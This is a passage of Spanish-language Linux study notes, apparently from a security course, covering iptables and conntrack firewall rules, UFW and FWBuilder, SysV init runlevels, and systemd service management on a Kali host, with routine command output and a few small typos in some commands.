64 bytes from 127.0.0.1: icmp_seq=4 ttl=64 time=0.029 ms
64 bytes from 127.0.0.1: icmp_seq=5 ttl=64 time=0.029 ms
64 bytes from 127.0.0.1: icmp_seq=6 ttl=64 time=0.046 ms
64 bytes from 127.0.0.1: icmp_seq=7 ttl=64 time=0.043 ms
64 bytes from 127.0.0.1: icmp_seq=8 ttl=64 time=0.030 ms
64 bytes from 127.0.0.1: icmp_seq=9 ttl=64 time=0.028 ms
64 bytes from 127.0.0.1: icmp_seq=10 ttl=64 time=0.033 ms

--- 127.0.0.1 ping statistics ---
10 packets transmitted, 10 received, 0% packet loss, time 9199ms
rtt min/avg/max/mdev = 0.019/0.035/0.064/0.011 ms

kali@kali:~$ sudo iptables -nvL
Chain INPUT (policy ACCEPT 0 packets, 0 bytes)
 pkts bytes target     prot opt in     out     source               destination         
    0     0            all  --  *      *       192.168.1.37         0.0.0.0/0           
   78  5464            all  --  *      *       192.168.1.0/24       0.0.0.0/0           
   26  2184            all  --  *      *       127.0.0.1            127.0.0.1           
   34  2584            all  --  *      *       127.0.0.1            0.0.0.0/0           

Chain FORWARD (policy DROP 0 packets, 0 bytes)
 pkts bytes target     prot opt in     out     source               destination         

Chain OUTPUT (policy ACCEPT 0 packets, 0 bytes)
 pkts bytes target     prot opt in     out     source               destination
```

El valor de *bytes* para las entradas 127.0.0.1 aumentó debido a que los paquetes de ping se envían hacia y desde el host local. Una última cosa antes de continuar es que iptables no es persistente después de reiniciar. Las reglas deben guardarse con *iptables-save*. Avancemos y guardemos las reglas actuales ahora.

```
kali@kali:~$ sudo iptables-save
# Generated by iptables-save v1.8.7 on Mon Jul 19 06:07:27 2021
*filter
:INPUT ACCEPT [0:0]
:FORWARD DROP [0:0]
:OUTPUT ACCEPT [0:0]
-A INPUT -s 192.168.1.37/32 
-A INPUT -s 192.168.1.0/24 
-A INPUT -s 127.0.0.1/32 -d 127.0.0.1/32 
-A INPUT -s 127.0.0.1/32 
COMMIT
# Completed on Mon Jul 19 06:07:27 2021
```

Después de ejecutar el comando, las reglas de iptables que creamos permanecerán intactas después de reiniciar el sistema.

Ahora que discutimos cómo trabajar agregando reglas al firewall y modificándolas, en la siguiente sección, refinaremos estas reglas aún más para hacer un firewall más práctico.

<br />

**Advanced Firewall Rules with IPTables**

Las reglas extendidas hacen que el firewall sea más práctico para filtrar el tráfico en función de múltiples condiciones. Estos son importantes para comprender si es necesario tener en cuenta el tráfico de la red al crear el conjunto de reglas del cortafuegos.

En la sección anterior, discutimos el proceso de agregar, eliminar e insertar reglas dentro de una cadena de iptables. La política predeterminada en la cadena INPUT es ACCEPT, y las reglas que agregamos siguieron esa política predeterminada. Esto significa que esas reglas en realidad no hicieron nada para proteger el firewall, aparte de monitorear los paquetes y los datos comunicados en los conjuntos de reglas especificados.

Dado que la acción no se agregó en los comandos que ingresamos, se heredó la acción de política predeterminada. Incluso si cambiamos la política predeterminada a una acción diferente, con la opción *-P*, las reglas de la cadena seguirán heredando esa acción de política.

Vamos a mostrar las iptables que ya hemos configurado.

```
kali@kali:~$ sudo iptables -L --line-numbers
[sudo] password for kali: 
Chain INPUT (policy ACCEPT)
num  target     prot opt source               destination         
1               all  --  192.168.1.37         anywhere            
2               all  --  192.168.1.0/24       anywhere            
3               all  --  localhost            localhost           
4               all  --  localhost            anywhere            

Chain FORWARD (policy DROP)
num  target     prot opt source               destination         

Chain OUTPUT (policy ACCEPT)
num  target     prot opt source               destination
```

En la lista de reglas, supongamos que queremos descartar todo el tráfico de la red 192.168.1.0/24 pero aún permitir el host en 192.168.1.37. Reemplacemos (*-R* ) la regla para la red y agreguemos el destino DROP con la opción *-j*.

```
kali@kali:~$ sudo iptables -R INPUT 2 -s 192.168.1.0/24 -j DROP

kali@kali:~$ sudo iptables -L --line-numbers
Chain INPUT (policy ACCEPT)
num  target     prot opt source               destination         
1               all  --  192.168.1.37         anywhere            
2    DROP       all  --  192.168.1.0/24       anywhere            
3               all  --  localhost            localhost           
4               all  --  localhost            anywhere            

Chain FORWARD (policy DROP)
num  target     prot opt source               destination         

Chain OUTPUT (policy ACCEPT)
num  target     prot opt source               destination
```

Como se muestra en la lista anterior, el *objetivo* cambió a DROP para la red 192.168.1.0/24. Dado que los cortafuegos funcionan leyendo la primera regla y pasando a la siguiente hasta que se encuentra una coincidencia, el host 192.168.1.37 seguirá teniendo acceso a nuestro host.

Refinemos el acceso de este host a solo el puerto TCP 8080 a nuestro host local. Nuevamente, usaremos la opción de reemplazo para esta entrada de línea. Para especificar el puerto, usaremos la opción *--dport* (puerto de destino).

```
kali@kali:~$ sudo iptables -R INPUT 1 -s 192.168.1.37 -d 127.0.0.1 -p tcp --dport 8080

kali@kali:~$ sudo iptables -nL --line-numbers
Chain INPUT (policy ACCEPT)
num  target     prot opt source               destination         
1               tcp  --  192.168.1.37         127.0.0.1            tcp dpt:8080
2    DROP       all  --  192.168.1.0/24       0.0.0.0/0           
3               all  --  127.0.0.1            127.0.0.1           
4               all  --  127.0.0.1            0.0.0.0/0           

Chain FORWARD (policy DROP)
num  target     prot opt source               destination         

Chain OUTPUT (policy ACCEPT)
num  target     prot opt source               destination
```

La primera regla se reemplazó con un puerto de destino específico para esa regla.

Si se conoce el puerto de origen, se puede usar la opción *--sport* para especificar ese puerto.

Hay otra opción que se puede utilizar para crear reglas basadas en el tipo de conexión realizada. Esta opción es parte del módulo *conntrack*, que usaba la opción *-m conntrack* Este subconjunto del módulo es la opción *--ctstate*, que forma parte del paquete *iptables-extensions*. Hay muchos estados de seguimiento de conexión, pero algunos de los más importantes se enumeran a continuación.

Tenga en cuenta que en los kernels de Linux más antiguos, esta opción es *--state* en lugar de *-ctstate*.

- **INVALID**: el paquete no está asociado a ninguna conexión conocida.

- **NEW**: el paquete ha iniciado una nueva conexión o está asociado con una conexión que no ha visto paquetes en ambas direcciones.

- **ESTABLISHED** : El paquete está asociado con una conexión que ha visto paquetes en ambas direcciones.

- **RELATED** : El paquete está iniciando una nueva conexión, pero está asociado con una conexión existente, como una transferencia de datos FTP o un error ICMP.
   
- **UNTRACKED** : el paquete no se rastrea en absoluto, lo que sucede si lo quita explícitamente usando -j CT --notrack en la tabla sin procesar.

El uso de conntrack hará de iptables un 'stateful firewall'. La configuración del stateful firewall garantizará que los paquetes que forman parte de una conexión existente puedan comunicarse. Insertemos lo siguiente como una nueva regla.

```
kali@kali:~$ sudo iptables -I INPUT 1 -m conntrack --ctstate RELATED,ESTABLISHED -j ACCEPT

kali@kali:~$ sudo iptables -L --line-numbers
Chain INPUT (policy ACCEPT)
num  target     prot opt source               destination         
1    ACCEPT     all  --  anywhere             anywhere     <--        ctstate RELATED,ESTABLISHED
2               tcp  --  192.168.1.37         localhost            tcp dpt:http-alt
4    DROP       all  --  192.168.1.0/24       anywhere            
5               all  --  localhost            localhost           
6               all  --  localhost            anywhere            

Chain FORWARD (policy DROP)
num  target     prot opt source               destination         

Chain OUTPUT (policy ACCEPT)
num  target     prot opt source               destination
```

Se insertó una nueva regla como la primera regla en la cadena INPUT que realizará un seguimiento de las conexiones existentes.

Es una buena práctica agregar una acción DROP para cualquier paquete que tenga un estado de conexión INVALID. Comencemos insertando esta regla al comienzo de la cadena INPUT.

```
kali@kali:~$ sudo iptables -I INPUT 2 -m conntrack --ctstate INVALID -j DROP

kali@kali:~$ sudo iptables -L --line-numbers
Chain INPUT (policy ACCEPT)
num  target     prot opt source               destination         
1    ACCEPT     all  --  anywhere             anywhere             ctstate RELATED,ESTABLISHED
2    DROP       all  --  anywhere             anywhere             ctstate INVALID
3               tcp  --  192.168.1.37         localhost            tcp dpt:http-alt
4    DROP       all  --  192.168.1.0/24       anywhere            
5               all  --  localhost            localhost           
6               all  --  localhost            anywhere            

Chain FORWARD (policy DROP)
num  target     prot opt source               destination         

Chain OUTPUT (policy ACCEPT)
num  target     prot opt source               destination
```

Con la configuración de la lista anterior, cualquier tráfico que se origine en nuestro host será aceptado nuevamente en nuestro host. Las conexiones NO VÁLIDAS se eliminarán inmediatamente.

Ahora que cubrimos las reglas extendidas, las políticas predeterminadas, las opciones adicionales y la creación de un firewall con estado con iptables, ahora tenemos el conocimiento para crear conjuntos de reglas personalizadas para satisfacer las necesidades de firewall de una red o host.

<br />


#### 2.13. UFW & FWBuilder

A veces, es más fácil tener una interfaz de usuario para manejar las reglas del firewall. Hay dos herramientas que podemos usar para lograr esto: *Uncomplicated Firewall* (UFW) y *FWBuilder*. Ambas herramientas son simplemente interfaces frontales que aprovechan el poder de iptables.

Primero, examinemos UFW. Podemos instalarlo con la *apt*.

```
kali@kali:~$ sudo apt install ufw
[sudo] password for kali: 
Reading package lists... Done
Building dependency tree... Done
Reading state information... Done
...

Setting up ufw (0.36-7.1) ...

Creating config file /etc/ufw/before.rules with new version

Creating config file /etc/ufw/before6.rules with new version

Creating config file /etc/ufw/after.rules with new version

Creating config file /etc/ufw/after6.rules with new version
update-rc.d: We have no instructions for the ufw init script.
update-rc.d: It looks like a non-network service, we enable it.
Created symlink /etc/systemd/system/multi-user.target.wants/ufw.service → /lib/systemd/system/ufw.service.
Processing triggers for kali-menu (2021.2.3) ...
Processing triggers for rsyslog (8.2102.0-2) ...
Processing triggers for man-db (2.9.4-2) ...
```

Ahora que UFW está instalado, podemos verificar el estado del firewall con el comando **ufw status .**

```
kali@kali:~$ sudo ufw status
Status: inactive
```

El poder de UFW radica en su comodidad. Es una herramienta simple para agregar reglas de firewall. Esto se puede hacer en función de las aplicaciones instaladas en un host. Para mostrar una lista de aplicaciones a las que UFW puede afectar, ejecutaremos **ufw app list** .

```
kali@kali:~$ sudo ufw app lis
Available applications:
  AIM
  Bonjour
  CIFS
  DNS
...
  SSH
  Samba
  Socks
  Telne
  Transmission
  Transparent Proxy
  VNC
  WWW
  WWW Cache
  WWW Full
  WWW Secure
...
```

SSH está resaltado en la lista anterior. Podemos obtener más información sobre esta aplicación con *ufw app info SSH*. Tenga en cuenta que la distinción entre mayúsculas y minúsculas puede afectar la salida de la herramienta.

```
kali@kali:~$ sudo ufw app info SSH
Profile: SSH
Title: SSH server
Description: SSH server

Port:
  22/tcp
```

El *Title, Description, Port* se muestran para el servicio SSH. Para permitir el tráfico a través del firewall relacionado con la aplicación, podemos usar la directiva *allow *. Permitamos SSH en las reglas del firewall.

```
kali@kali:~$ sudo ufw allow SSH
Rules updated
Rules updated (v6)
```

Ahora que agregamos reglas SSH al servidor de seguridad del host, el servidor de seguridad debe estar habilitado.

```
kali@kali:~$ sudo ufw enable
Firewall is active and enabled on system startup

kali@kali:~$ sudo ufw status
Status: active

To                         Action      From
--                         ------      ----
SSH                        ALLOW       Anywhere                  
SSH (v6)                   ALLOW       Anywhere (v6)             
```

SSH ahora está permitido en el servidor de seguridad del host desde *cualquier lugar*.

Esto solo ha sido una cobertura básica de la herramienta ufw. Vamos a desactivarlo antes de pasar a *FWBuilder*.

```
kali@kali:~$ sudo ufw disable
Firewall stopped and disabled on system startup

kali@kali:~$ sudo ufw status
Status: inactive/
```

Con UFW deshabilitado, discutiremos rápidamente FWBuilder y su interfaz GUI. FWBuilder no está instalado de forma predeterminada en Kali, así que tomemos un momento para instalarlo.

```
kali@kali:~$ sudo apt install fwbuilder
[sudo] password for kali: 
Reading package lists... Done
Building dependency tree... Done
Reading state information... Done
...

After this operation, 43.6 MB of additional disk space will be used.
Do you want to continue? [Y/n] Y

...

Fetched 9,327 kB in 2min 4s (75.4 kB/s)                                                                                                                                                                                     
...
Setting up fwbuilder (5.3.7-4.1) ...
Setting up fwbuilder-doc (5.3.7-4.1) ...
Processing triggers for desktop-file-utils (0.26-1) ...
Processing triggers for man-db (2.9.4-2) ...
Processing triggers for shared-mime-info (2.0-1) ...
Processing triggers for menu (2.1.48) ...
Processing triggers for mailcap (3.69) ...
Processing triggers for kali-menu (2021.2.3) ...
```

Una vez instalado podemos ejecutarlo con **sudo fwbuilder** .

```
kali@kali:~$ sudo fwbuilder
Firewall Builder GUI 5.3.7
QStandardPaths: XDG_RUNTIME_DIR not set, defaulting to '/tmp/runtime-root'
```

Esto inicia la GUI y nos permite comenzar a construir el firewall.

<div style="text-align:center">
	<img src="{{ 'assets/img/pen/Pasted image 20230118124415.png' | relative_url }}" text-align="center"/>
</div>

Por el bien de la demostración, se eligió una plantilla predefinida. Esto es simplemente para mostrar cómo se ve la interfaz y dónde hacer los cambios de configuración necesarios dentro de la utilidad.

La GUI es una interfaz de arrastrar y soltar. Esto es especialmente conveniente cuando las reglas no están en orden y es necesario moverlas. Las modificaciones de las reglas se realizan en la parte inferior de la pantalla del *Editor*. El panel *Editor* cambiará según lo que se seleccione en el panel *Policy*

<div style="text-align:center">
	<img src="{{ 'assets/img/pen/Pasted image 20230118124520.png' | relative_url }}" text-align="center"/>
</div>

La imagen de arriba muestra un ejemplo de una regla de firewall. Los parámetros son los mismos que cubrimos en la sección de iptables, pero esta interfaz puede ser más fácil de usar debido a las imágenes y la capacidad de arrastrar y soltar conjuntos de reglas en el orden correcto.

Es importante tener en cuenta que FWBuilder puede traducir automáticamente direcciones IPv4 e IPv6, o se pueden especificar reglas para adaptarse a cualquiera de las necesidades. Cuando termine de crear las reglas de firewall en la GUI, las reglas se pueden compilar e instalar en el host. El archivo generado a partir de la compilación es un script que ejecutará las reglas establecidas para la _plataforma_ especificada ( _iptables_ en este ejemplo).

Más allá de iptables, cubrimos UFW y FWBuilder. La flexibilidad de estas herramientas y el conocimiento de lo que sucede debajo del capó demostrarán ser valiosos al crear, inspeccionar y buscar puntos débiles en la configuración de un firewall.

<br />


#### 2.14. Managing Network Services.

El *SysV Init* es un service startup system heredado que gestiona los servicios de Linux. Junto con él se encuentra Systemd. Vamos ambos systemas de gestión de servicios y las diferencias entre ambos. 

<br />

**Sys V**

Para comprender mejor cómo se ejecutan los servicios en un sistema, es importante definir qué son los *runlevels* o niveles de ejecución. Los niveles de ejecución son designaciones establecidas sobre cómo se inicia, un sistema Linux y qué servicios se ejecutan. Se dividen en 7 categorías.

- *runlevel 0*: el estado del sistema cuando se detiene o se apaga. Este no es un nivel de ejecución efectivo, pero se puede llamar para ejecutar un apagado del sistema.

- *runlevel 1 (modo de usuario único*): el estado en el que solo un usuario (raíz) puede iniciar sesión en el sistema para realizar tareas administrativas. El Networking está deshabilitado para este nivel de ejecución y solo se usa la interfaz de línea de comandos.

- *runlevel 2 (modo multiusuario*): Varios usuarios pueden realizar tareas administrativas, el networking está desactivado y se utiliza la interfaz de línea de comandos.

- *runlevel 3 (modo multiusuario con funciones de red*): se utiliza la interfaz de línea de comandos y la red está habilitada.

- *runlevel 4: Indefinido por defecto*: Esto está disponible para un nivel de ejecución personalizado, si es necesario.

- *runlevel 5 (modo multiusuario con una interfaz gráfica de usuario*): la red está habilitada. Este es el nivel de ejecución predeterminado en cualquier distribución de Linux que utilice una GUI.

- *runlevel 6:* el nivel de ejecución para reiniciar el host de Linux. Este es otro nivel de ejecución que no es efectivo, pero se puede llamar para ejecutar un reinicio del sistema.


Para mostrar el nivel de ejecución de trabajo actual, ejecutamos el comando:

```
kali@kali:~$ runlevel
N 5
```

El nivel de ejecución actual es *5*. Esto tiene sentido, ya que la GUI se usa en nuestro host Kali.

La configuración para establecer el runlevel predeterminado de un sistema Linux está en */etc/inittab*.

Es importante saber que, como derivado de Debian, Kali no usa *SysV Init*, por lo que muchos de los conceptos de esta sección no estarán presentes en nuestra instalación de Kali. Para la siguiente demostración, se usa una versión heredada de Ubuntu para mostrar los conceptos que estamos cubriendo. Dado que este es un sistema heredado, no se proporcionará una máquina para realizar estas actividades. Este archivo /etc/inittab es de una instalación de Ubuntu 6.06.

```
root@e1bf7396aea4:/# cat /etc/inittab
# /etc/inittab: init(8) configuration.
# $Id: inittab,v 1.91 2002/01/25 13:35:21 miquels Exp $

# The default runlevel.
id:2:initdefault:

# Boot-time system configuration/initialization script.
# This is run first except when booting in emergency (-b) mode.
si::sysinit:/etc/init.d/rcS

# What to do in single-user mode.
~~:S:wait:/sbin/sulogin

# /etc/init.d executes the S and K scripts upon change
# of runlevel.
#
# Runlevel 0 is halt.
# Runlevel 1 is single-user.
# Runlevels 2-5 are multi-user.
# Runlevel 6 is reboot.

l0:0:wait:/etc/init.d/rc 0
l1:1:wait:/etc/init.d/rc 1
l2:2:wait:/etc/init.d/rc 2
l3:3:wait:/etc/init.d/rc 3
l4:4:wait:/etc/init.d/rc 4
l5:5:wait:/etc/init.d/rc 5
l6:6:wait:/etc/init.d/rc 6
...
```

En la lista anterior, se destacan varias entradas. La línea 

```
id:2:initdefault:
```

es el nivel de ejecución predeterminado para este host. El formato de estas líneas es *identificador único:nivel de ejecución:acción:proceso*.

Para esta instalación, el nivel de ejecución predeterminado es el nivel de ejecución 2. 

En la línea 

```
si::sysinit:/etc/init.d/rcS
```

el identificador único es "si". No hay ningún nivel de ejecución asociado. La acción a realizar es "sysinit" y el proceso es "/etc/init.d/rcS", que es un script que se ejecutará cuando se llame a este identificador.

Para cambiar el nivel de ejecución actual a uno diferente, podemos usar el comando runlevel. Si quisiéramos cambiar el nivel de ejecución a Runlevel 3, por ejemplo, ingresaríamos el **nivel de ejecución 3** .

Para evitar romper nuestra conexión con el host de Kali, no hagamos esto. Independientemente de que no realicemos un cambio de nivel de ejecución, es importante saber cómo hacerlo.

Cada nivel de ejecución tendrá un directorio */etc/rc#.d/* respectivo asociado. Esto se usa para agregar los servicios que se iniciarán para ese nivel de ejecución en forma de scripts. Inspeccionemos */etc/rc2.d/* en este host de Ubuntu.

```
root@4f165cb1f679:/# ls /etc/rc2.d/
S10sysklogd  S11klogd  S20makedev  S20ssh  S99rc.local  S99rmnologin
```

En la lista anterior, se muestran 6 scripts de inicio ( _S )._ Estos se ejecutan en orden alfanumérico a medida que el sistema ingresa al estado Runlevel 2.

<br />

- */etc/init.d*

Los scripts de servicio se encuentran en el directorio */etc/init.d/* de forma predeterminada en un sistema *SysV Init*. Desde este directorio podemos iniciar manualmente muchos servicios en el sistema linux.

```
root@4f165cb1f679:/# ls /etc/init.d/
README        bootlogd     checkroot.sh       halt         keymap.sh  makedev            mountdevsubfs  networking   quota     rc.local  rmnologin  skeleton       sysklogd  umountnfs.sh  waitnfs.sh
alsa-utils    bootmisc.sh  console-screen.sh  hostname.sh  klogd      module-init-tools  mountvirtfs    pcmciautils  quotarpc  rcS       sendsigs   ssh            udev      umountroot
bootclean.sh  checkfs.sh   glibc.sh           hwclock.sh   loopback   mountall.sh        mtab           procps.sh    rc        reboot    single     stop-bootlogd  umountfs  urandom

```

SSH está incluido en la lista. Podemos trabajar con servicios fuera de los niveles de ejecución, con ejecución manual de los scripts en el directorio */etc/init.d/*. Comencemos el servicio SSH.

```
root@6126fd75c46c:/# /etc/init.d/ssh start
 * Starting OpenBSD Secure Shell server...                                                                                                      [ ok ]
```

La respuesta "ok" indica que el servicio SSH se inició y se está ejecutando. Hay muchas otras posibilidades para las acciones de servicio. Ejecutemos el script sin un parámetro para listar las acciones disponibles.

```
root@6126fd75c46c:/# /etc/init.d/ssh
 * Usage: /etc/init.d/ssh {start|stop|reload|force-reload|restart}
```

Es importante tener en cuenta que no todos los scripts de servicio mostrarán un _Uso_ cuando el script se ejecuta de forma no aceptada. Este ejemplo es para demostrar que se puede agregar *{start|stop|reload|force-reload|restart}* a la ejecución del script para realizar diferentes acciones con el servicio.

Cambiemos nuestro enfoque de nuevo a nuestro host Kali para cubrir una última cosa sobre *SysV Init*: el comando *service*.

```
service service-name {start|stop|status}
```

Comencemos, obtengamos el estado y detengamos el servicio SSH en nuestro host Kali. Primero, iniciemos el servicio.

```
kali@kali:~$ sudo service ssh start
[sudo] password for kali: 
```

No hubo salida a la terminal. Verifiquemos si el servicio se está ejecutando utilizando la opción de *status*.

```
kali@kali:~$ sudo service ssh status
● ssh.service - OpenBSD Secure Shell server
     Loaded: loaded (/lib/systemd/system/ssh.service; disabled; vendor preset: disabled)
     Active: active (running) since Thu 2021-07-22 11:02:55 MST; 1min 3s ago
       Docs: man:sshd(8)
             man:sshd_config(5)
    Process: 64702 ExecStartPre=/usr/sbin/sshd -t (code=exited, status=0/SUCCESS)
   Main PID: 64703 (sshd)
      Tasks: 1 (limit: 4631)
     Memory: 1.0M
        CPU: 17ms
     CGroup: /system.slice/ssh.service
             └─64703 sshd: /usr/sbin/sshd -D [listener] 0 of 10-100 startups

Jul 22 11:02:55 kali systemd[1]: Starting OpenBSD Secure Shell server...
Jul 22 11:02:55 kali sshd[64703]: Server listening on 0.0.0.0 port 22.
Jul 22 11:02:55 kali sshd[64703]: Server listening on :: port 22.
Jul 22 11:02:55 kali systemd[1]: Started OpenBSD Secure Shell server.
```

El estado es "activo (en ejecución)", como se verifica en la lista anterior. Detengamos el servicio ahora:

```
kali@kali:~$ sudo service ssh stop
```

El servicio ahora está detenido, nuevamente sin salida a la ventana de terminal.

Este proceso es muy similar al script SSH que se muestra en el directorio */etc/init.d/* anteriormente. *Service* se considera un comando heredado, por lo que puede volverse menos común encontrar sistemas *SysV Init*.

Esta ejecución de la utilidad de servicio es una redirección compatible con versiones anteriores al siguiente tema de esta sección: *Systemd*. Cubrimos *runlevels*, *init*, servicios en */etc/init.d/* y cómo trabajar con ellos, y la utilidad del comando *service*.

<br />

**Systemd**

La mayoría de los sistemas Linux de hoy utilizan un sistema de gestión de servicios llamado *Systemd*.  Con este uso, es importante comprender cómo se gestionan los servicios. Esta sección cubrirá cómo determinar si un sistema Linux usa Systemd, cómo trabajar con los servicios del sistema, por qué Linux se alejó de SysV Init y las similitudes entre los dos.

Antes de pasar a los detalles de Systemd, averigüemos si Kali lo está usando. Para hacer esto, podemos examinar el primer proceso que se creó en el host de Linux. Podemos hacer esto con el comando *ps 1*:

```
kali@kali:~$ ps 1
    PID TTY      STAT   TIME COMMAND
      1 ?        Ss     0:05 /sbin/init splash
```

*/sbin/init* es históricamente un proceso utilizado por SysV Init. Usemos el comando de *file* para determinar qué es este archivo.

```
kali@kali:~$ file /sbin/ini
/sbin/init: symbolic link to /lib/systemd/systemd
```

En la lista anterior, podemos determinar que nuestro host Kali está usando Systemd ya que */sbin/init* es un enlace simbólico a */lib/systemd/systemd* y es el primer proceso que se usa para inicializar el sistema al iniciarse.

Systemd usa una utilidad llamada *systemctl* para controlarlo. Esto es muy similar *service*, pero la sintaxis se invierte. Tomemos SSH como ejemplo y comencemos esto en nuestro host con *systemctl*.

```
kali@kali:~$ sudo systemctl start ssh
[sudo] password for kali:
```

Dado que no hubo una salida de error en nuestra pantalla, podemos esperar que el servicio SSH esté en funcionamiento. También hay varias otras acciones que se pueden realizar con la utilidad systemctl.

- *stop* detendrá un servicio.

- *status* mostrará el estado de ejecución de un servicio.
   
- *recargar* recargará los archivos de configuración para un servicio sin necesidad de detener el servicio.
   
- *habilitar/deshabilitar* marcará el servicio para que se ejecute en un arranque del sistema o no.
   

Verifiquemos el **estado** del servicio SSH.

```
kali@kali:~$ systemctl status ssh
● ssh.service - OpenBSD Secure Shell server
     Loaded: loaded (/lib/systemd/system/ssh.service; disabled; vendor preset: disabled)
     Active: active (running) since Thu 2021-07-22 12:52:23 MST; 1h 2min ago
       Docs: man:sshd(8)
             man:sshd_config(5)
    Process: 65249 ExecStartPre=/usr/sbin/sshd -t (code=exited, status=0/SUCCESS)
    Process: 65292 ExecReload=/usr/sbin/sshd -t (code=exited, status=0/SUCCESS)
    Process: 65293 ExecReload=/bin/kill -HUP $MAINPID (code=exited, status=0/SUCCESS)
   Main PID: 65250 (sshd)
      Tasks: 1 (limit: 4631)
     Memory: 1.1M
        CPU: 42ms
     CGroup: /system.slice/ssh.service
             └─65250 sshd: /usr/sbin/sshd -D [listener] 0 of 10-100 startups
```

Verificamos que SSH se está ejecutando actualmente en nuestro host Kali.

En *SysV Init*, cubrimos el concepto de los 7 niveles de ejecución. También examinamos cómo se manejaron los niveles de ejecución en los directorios */etc/rc#.d/* y cómo se ejecutarían los scripts en orden alfanumérico.

Systemd mejoró este diseño mediante la utilización de *targets-units*. Estos son similares a los *runlevels*, ya que definen qué servicios se ejecutan en cada nivel. A diferencia de los niveles de ejecución, hay más flexibilidad para definir más de 7 clasificaciones.

Mostremos las unidades objetivo de nuestro host Kali con **systemctl list-units** .

```
kali@kali:~$ sudo systemctl list-units --type=target --all
  UNIT                                                                                 LOAD   ACTIVE   SUB    DESCRIPTION
  basic.target                                                                         loaded active   active Basic System
  blockdev@dev-disk-by\x2duuid-7f8e9fc5\x2db150\x2d4c9f\x2db1c5\x2db7928fe02ed8.target loaded inactive dead   Block Device Preparation for /dev/disk/by-uuid/7f8e9fc5-b150-4c9f-b1c5-b7928fe02ed8
  blockdev@dev-dm\x2d1.target                                                          loaded inactive dead   Block Device Preparation for /dev/dm-1
  blockdev@dev-mapper-RedHatAugust\x2d\x2dvg\x2droot.target                            loaded inactive dead   Block Device Preparation for /dev/mapper/RedHatAugust--vg-root
  blockdev@dev-mapper-RedHatAugust\x2d\x2dvg\x2dswap_1.target                          loaded inactive dead   Block Device Preparation for /dev/mapper/RedHatAugust--vg-swap_1
  blockdev@dev-sda1.target                                                             loaded inactive dead   Block Device Preparation for /dev/sda1
  cryptsetup.target                                                                    loaded active   active Local Encrypted Volumes
  emergency.target                                                                     loaded inactive dead   Emergency Mode
  first-boot-complete.target                                                           loaded inactive dead   First Boot Complete
  getty-pre.target                                                                     loaded inactive dead   Login Prompts (Pre)
  getty.target                                                                         loaded active   active Login Prompts
  graphical.target                                                                     loaded active   active Graphical Interface
  local-fs-pre.target                                                                  loaded active   active Local File Systems (Pre)
  local-fs.target                                                                      loaded active   active Local File Systems
  multi-user.target                                                                    loaded active   active Multi-User System
  network-online.target                                                                loaded active   active Network is Online
  network-pre.target                                                                   loaded inactive dead   Network (Pre)
  network.target                                                                       loaded active   active Network
  nfs-client.target                                                                    loaded active   active NFS client services
  nss-user-lookup.target                                                               loaded inactive dead   User and Group Name Lookups
  paths.target                                                                         loaded active   active Paths
  remote-fs-pre.target                                                                 loaded active   active Remote File Systems (Pre)
  remote-fs.target                                                                     loaded active   active Remote File Systems
  rescue.target                                                                        loaded inactive dead   Rescue Mode
  shutdown.target                                                                      loaded inactive dead   Shutdown
  slices.target                                                                        loaded active   active Slices
  sockets.target                                                                       loaded active   active Sockets
  sound.target                                                                         loaded active   active Sound Card
  stunnel.target                                                                       loaded active   active TLS tunnels for network services - per-config-file target
  swap.target                                                                          loaded active   active Swap
  sysinit.target                                                                       loaded active   active System Initialization
  time-set.target                                                                      loaded inactive dead   System Time Set
  time-sync.target                                                                     loaded inactive dead   System Time Synchronized
  timers.target                                                                        loaded active   active Timers
  umount.target                                                                        loaded inactive dead   Unmount All Filesystems

LOAD   = Reflects whether the unit definition was properly loaded.
ACTIVE = The high-level unit activation state, i.e. generalization of SUB.
SUB    = The low-level unit activation state, values depend on unit type.
35 loaded units listed.
To show all installed unit files use 'systemctl list-unit-files'.
```

En el caso del listado anterior, actualmente hay 35 unidades cargadas. Esto es mucho más dinámico que el limitado _7_ en los niveles de ejecución SysV Init. También hay tres categorizaciones para cada unidad objetivo: *LOAD*, *ACTIVE* y *SUB*.

- LOAD especifica si una unidad de destino se carga en el host de Linux. Esto significa que el sistema puede leer el archivo de configuración de la unidad. Si está cargado, se puede llamar para cambiar el comportamiento de la unidad objetivo del sistema. Esto se puede usar para tomar acciones como habilitar/deshabilitar servicios de red en un sistema.

- ACTIVE especifica si una unidad objetivo en particular está actualmente activa o no. Esto no significa necesariamente que un conjunto de servicios se esté ejecutando bajo ese destino, pero la unidad de destino se ejecutó si dice _active_ .

- SUB especifica el estado de los servicios que se ejecutan en una unidad de destino. Algunos tipos de servicios pueden ejecutarse una sola vez y no son continuos. Esto puede mostrarse como salido. Si un servicio es continuo y está en ejecución, se mostrará activo debajo de este campo. Si el proceso asociado con el servicio no se está ejecutando, se mostrará inactivo _._

El beneficio de las unidades de destino es que se pueden ejecutar en paralelo y no es una elección de uno u otro. No es necesario iniciarlos o detenerlos en un orden secuencial, como los directorios */etc/rc#.d/*. También existe la ventaja de proporcionar dependencias (condiciones que deben cumplirse antes de una operación) dentro de los servicios de destino. Estos iniciarán automáticamente las dependencias o saldrán con un error si no se puede cumplir la dependencia. Las unidades de destino y los servicios se pueden encontrar en */usr/lib/systemd/system/*. Analicemos uno de los archivos de servicio en este directorio.

```
kali@kali:~$ cat /usr/lib/systemd/system/ssh.service
[Unit]
Description=OpenBSD Secure Shell server
Documentation=man:sshd(8) man:sshd_config(5)
After=network.target auditd.service
ConditionPathExists=!/etc/ssh/sshd_not_to_be_run

[Service]
EnvironmentFile=-/etc/default/ssh
ExecStartPre=/usr/sbin/sshd -t
ExecStart=/usr/sbin/sshd -D $SSHD_OPTS
ExecReload=/usr/sbin/sshd -
ExecReload=/bin/kill -HUP $MAINPID
KillMode=process
Restart=on-failure
RestartPreventExitStatus=255
Type=notify
RuntimeDirectory=sshd
RuntimeDirectoryMode=0755

[Install]
WantedBy=multi-user.target
Alias=sshd.service
```

Hay tres líneas resaltadas en la lista anterior. La línea _After_ es cómo Systemd maneja las dependencias en los servicios. También se podría agregar una línea Antes si este servicio necesita comenzar antes que otra unidad de destino.

La línea *ExecStart* es la ejecución del script para iniciar el servicio.

La línea *WantedBy* define en qué destino se debe incluir este servicio. En el caso del ejemplo de listado, el servicio SSH se incluye en la unidad de destino *multi-user.target*.

A pesar de que hay tantas unidades objetivo, todavía existe una correlación entre los niveles de ejecución y las unidades objetivo.

```
kali@kali:~$ ls -al /lib/systemd/system/runlevel*
lrwxrwxrwx 1 root root   15 Apr 12 11:21 /lib/systemd/system/runlevel0.target -> poweroff.target
lrwxrwxrwx 1 root root   13 Apr 12 11:21 /lib/systemd/system/runlevel1.target -> rescue.target
